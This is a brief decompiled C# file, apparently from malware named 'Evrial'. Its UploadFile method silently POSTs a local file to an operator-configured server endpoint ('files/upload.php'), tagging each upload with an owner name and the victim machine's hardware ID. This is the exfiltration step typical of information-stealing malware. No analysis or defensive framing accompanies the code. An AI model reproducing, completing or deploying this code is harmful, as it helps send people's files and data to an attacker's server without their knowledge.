using System;
using System.Net;

namespace Evrial
{
	// Token: 0x02000006 RID: 6
	internal static class Network
	{
		// Token: 0x06000014 RID: 20 RVA: 0x000024F4 File Offset: 0x000006F4
		public static void UploadFile(string path)
		{
			try
			{
				new WebClient().UploadFile(RawSettings.SiteUrl + string.Format("files/upload.php?user={0}&hwid={1}", RawSettings.Owner, RawSettings.HWID), "POST", path);
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}
	}
}
